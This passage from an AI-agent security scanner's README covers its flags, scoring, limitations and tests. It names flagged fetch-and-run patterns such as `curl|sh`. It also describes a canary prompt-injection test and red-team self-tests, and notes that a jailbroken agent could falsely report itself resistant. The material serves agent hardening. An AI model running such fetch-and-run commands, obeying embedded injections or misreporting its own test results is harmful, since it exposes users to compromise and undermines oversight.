  *before* you trust it. Flags unpinned installs (`npx @latest`, unversioned packages), `curl|sh`
  bootstrap, plaintext-HTTP remote transports, env-variable secret passthrough, and overly broad
  OAuth scopes. Verdict per server: NO KNOWN ISSUE / SUSPICIOUS / DANGEROUS. Local and read-only — no
  network calls; it writes only a one-line coverage-freshness entry under `~/.clawseccheck/`
  (suppressed by `--no-history`). Targets the #1 agent supply-chain gap: most tools audit your
  skills but not the MCP servers wired into your agent.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
- **`--trend`** records the current audit result to a local append-only history file and prints
  a table of past scores with per-run arrows. Every recorded row is shown, each tagged with the
  run that produced it (`[audit]`, or `[test]`/`[dev]` for a development/CI run picked up via
  `CLAWSECCHECK_RUN_SOURCE`, or `[legacy]` for a pre-existing entry with no source recorded) —
  nothing is ever hidden. History stays on your machine only.
- **`--percentile`** compares your score against a bundled offline reference profile — no network,
  no telemetry.
- **`--verbose` / `--debug` / `--log PATH`** activate structured local logging. Config values
  that may hold secrets are redacted before being written.

## Uninstall / cleanup

Everything ClawSecCheck ever writes lives under `~/.clawseccheck/` (score history, monitor
state/events, the coverage-freshness ledger) — nothing is scattered elsewhere and nothing is
ever uploaded. To remove that local store:

```bash
clawseccheck --purge          # lists the files, asks for confirmation, then deletes them
clawseccheck --purge --yes    # skip the prompt (for scripted uninstall)
```

`--purge` only ever touches its own known files (`history.jsonl`, `events.jsonl`, `state.json`,
`coverage.json`, plus their lock sidecars) — never a directory glob or recursive delete, so
anything else you keep under that path is untouched. It exits without deleting anything if you
answer no (or there's nothing to purge), and reports the count of files removed on success.
Removing the `clawseccheck` package/skill itself is a separate, normal uninstall step (e.g.
`pip uninstall clawseccheck` or removing the skill directory) — `--purge` only clears the local
data store.

That fixed four-name list is deliberate (never a glob), but it means a stray `.<name>.<random>.tmp`
sidecar — left behind only if the process is killed (e.g. `SIGKILL`) between writing the temp file
and the atomic rename that replaces the real one — is not one of the four and is not removed by
`--purge`. It is inert (never read back by anything) and rare; `rm ~/.clawseccheck/.*.tmp` clears
it by hand if you ever see one.

## Baseline (accepting findings)

Reviewed a finding and decided it's acceptable? Add it to `~/.openclaw/.clawseccheckignore` —
one entry per line, either a check id (`B14`) or a finding fingerprint (`B14:ab12cd34`, shown
with `--show-suppressed`). Suppressed findings drop out of the **score**, the **report**, and
**monitor** alerts — so re-runs and `--monitor` stop nagging about things you've accepted.

```text
# ~/.openclaw/.clawseccheckignore
B14            # accept the egress-surface advisory
B12:1a2b3c4d   # accept one specific local-model finding
```

## Scoring

Weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1). **Honesty hard-caps:** any open
CRITICAL caps the score at 49, any open HIGH at 79 — you can never show an "A" with a critical
hole. Grades: A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. The shareable card shows **only the
grade + score + trifecta ratio — never the findings** (sharing must not hand attackers your map).

## Public API & stability

The public contract below has been frozen since **1.0.0**. The breaking changes it anticipated
shipped in **2.0.0** (English-only output) and **3.0.0**; breaking any item below still requires
a major bump (SemVer). The freeze was cut after the attestation layer settled, an adversarial
review, and four field runs whose every finding was fixed or deliberately documented — with zero
hard false positives on real configs.

**Frozen contract (breaking these → major bump):**

- **CLI flags** and their documented meaning (`--json`, `--sarif`, `--card`, `--monitor`,
  `--fail-under`, `--exit-code`, …).
- **`--json` schema:** top-level `score`, `grade`, `capped`, `raw_score`, `trifecta`,
  `findings[]`, `next_actions[]`; each finding's `id`, `title`, `severity`, `status`, `detail`,
  `fix`, `framework`, `confidence`, `evidence`.
- **SARIF 2.1.0 output** shape (rule ids = check ids; `properties.confidence` + `.evidence`).
- **Public Python API:** `clawseccheck.audit(...) -> (ctx, findings, ScoreResult)` and the
  `Finding` field names.
- **Check IDs** (full generated catalog in [`CHECKS.md`](CHECKS.md)): an id, once shipped, keeps its meaning.
- **Status / confidence vocabularies:** `PASS|WARN|FAIL|UNKNOWN`, `HIGH|MEDIUM|LOW|ATTESTED`.
- **Scoring bands:** A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50; `UNKNOWN` never scores; advisory
  checks (`scored=False`) never move the grade.

**Explicitly experimental (may change without a major bump, by design):**

- The **attestation layer**: the `clawseccheck-attest/1` self-report schema (note the `/1` — it is
  explicitly versioned to evolve), the `--ask`/`--attest` flow, the verb→blast-radius
  taxonomy, and the declared-vs-effective cross-check. The `ATTESTED` confidence tier exists to
  mark exactly this: a self-report is weaker than a config fact, advisory, and never overrides
  one. Freezing the newest surface now would over-commit, so it stays flexible under this label
  until it has had broader real-world use.

## Honest limitations

- **Heuristic local audit, not a formal proof of safety.** ClawSecCheck inspects
  configuration text and known patterns; it cannot reason about all possible runtime
  behaviours or formally verify your agent's security properties.
- **A clean report / grade-A means "no known attack pattern matched" — not "safe."**
  External benchmarks (SkillTrustBench, OASB) found detection precision very high (few
  false alarms — 1 false-positive in 3880 benign OASB samples) but malicious-sample
  *recall* is the measured weak point: between 0.09 (OASB, per-skill FAIL-only) and 0.41
  (SkillTrustBench, malicious-class recall). Most misses were attacks *described in prose*
  rather than shipped as code — a blind spot dedicated detectors have since started closing,
  though the fix hasn't been re-measured against the same benchmark yet. A PASS tells you
  what the scanner recognized, not that nothing is wrong.
- **Does not replace runtime red-teaming.** Static configuration analysis is a starting
  point, not a substitute for adversarial testing against a running agent.
- **Does not mine what your agent has already logged, by default.** The default report
  scores your *configuration*; it doesn't check whether a trifecta is already sitting in
  your OpenClaw trajectory sidecar. `--behavioral` (proven-by-log verb-sequence trifecta /
  outcome anomaly / capability drift, plus a runtime-block / evasive-tool-name / trajectory-
  divergence signal read from OpenClaw's own `audit_events` table) and `--analyze-trajectory`
  (skill-indicator correlation against real tool-call arguments) are the two modes that do —
  the default report's scope note now points at both, alongside the live-test modes below.
- **The active self-tests and attestation are a self-report protocol, not an
  independently-verified check — with one narrow, partial exception.** `--redteam` /
  `--dryrun` / `--self-test` emit deterministic test material for your agent to run and
  grade, and `--ask` / `--attest` ask your agent to declare its own capabilities — because
  the tool stays local and makes no network calls (it cannot spin up and observe an
  independent agent process). An already-compromised or jailbroken agent could therefore
  report `RESISTANT` or a benign capability set dishonestly, and for `--redteam`/`--dryrun`/
  `--attest` there is still no local artifact that could contradict a dishonest self-report
  at all. **`--canary`/`--multiturn` now get partial corroboration:** `--analyze-trajectory`
  cross-checks a claimed run against your OpenClaw trajectory log, in two legs of very
  different strength. The "did it run" leg is solid — it looks for ClawSecCheck's own
  namespaced token in a submitted prompt, which is hard to false-positive since that
  namespace is ours alone. The "was the verdict honest" leg is best-effort only — it looks
  for the same token in the agent's own reply, excluding the (common) case where the agent
  simply *showed you the render* rather than complying with it, but a sufficiently evasive
  reply can still slip past that exclusion, so this leg never fails anything and stays
  outside the A-F score. Neither leg makes the tool render a RESISTANT/VULNERABLE verdict
  itself — that is still spoken by the host LLM in chat — and the coverage ledger these
  flags write to still only attests that the flag was invoked, never that the test executed
  or what it concluded. Treat every one of these results as the subject grading its own
  homework, now partially corroborated against the observable trajectory log where noted
  above — not as independent proof.
- **May produce false positives and false negatives.** Evidence-gating keeps noise low,
  but heuristics can miss novel attack patterns and can misread edge-case configurations.
- **Read scope is bounded:** config, bootstrap markdown, installed-skill text, OpenClaw log
  files, agent session logs, host OS recon (security-tool paths, a few firewall config files,
  proxy env-var names, and on Windows read-only registry queries), and credential-store path
  presence — not an exhaustive scan of your filesystem, and credential-store contents are
  never read.
- **UNKNOWN is not PASS.** Unreadable files or unparseable configs are reported as
  UNKNOWN and excluded from the score, never silently marked safe.
- **Vetting the scanner itself** (`--vet` pointed at ClawSecCheck's own source) reports
  *safe with a note* — a security tool necessarily ships attack signatures as data.

**Found a false positive/negative or something confusing?** Open an issue at
<https://github.com/gl0di/clawseccheck/issues> with the output of `clawseccheck --json`
(it redacts secret *values* — only key names/paths appear) and your OpenClaw version. Do
not paste raw secrets.

## The OpenClaw ecosystem

ClawSecCheck is one skill in a fast-growing OpenClaw ecosystem — and that growth is exactly
why a local, read-only vetting tool exists. Browse more, but **vet before you trust**:

| | Resource | What it is |
|---|---|---|
| 🦞 | **[ClawHub — clawseccheck](https://clawhub.ai/gl0di/skills/clawseccheck)** | This skill's page — install, current version, changelog |
| 📚 | [awesome-openclaw-skills](https://github.com/VoltAgent/awesome-openclaw-skills) | 5,300+ community skills, organized by category |
| 🤖 | [awesome-openclaw-agents](https://github.com/mergisi/awesome-openclaw-agents) | Agent templates, real-world use cases & integrations |
| 🛡️ | [OpenClaw gateway security docs](https://docs.openclaw.ai/gateway/security) | The platform's own hardening guide |

> 🦞 **Before installing anything from these lists** (this skill included): read the source,
> vet it — `clawseccheck --vet <path>` — and pin a known release. The ClawHavoc wave proved
> that *"popular on a list"* is not the same as *"safe to run."*

## Tests

A security tool should be heavily tested — so it is: 367 test files and 7,836
tests, run in CI on **Python 3.9 and 3.12** alongside `ruff`. Tests are **offline and
read-only** (no network, nothing written outside the test's temp dir); every check ships a
**clean fixture** (no finding) *and* a **bad fixture** (the finding fires) plus explicit
`UNKNOWN`-path coverage; and the release bar is **zero false-positive FAILs on real configs**.

```bash
python3 -m pytest -q       # full suite
ruff check .               # lint
```

The test suite and fixtures live in the [GitHub repo](https://github.com/gl0di/clawseccheck) —
they are not bundled in the installed skill package.
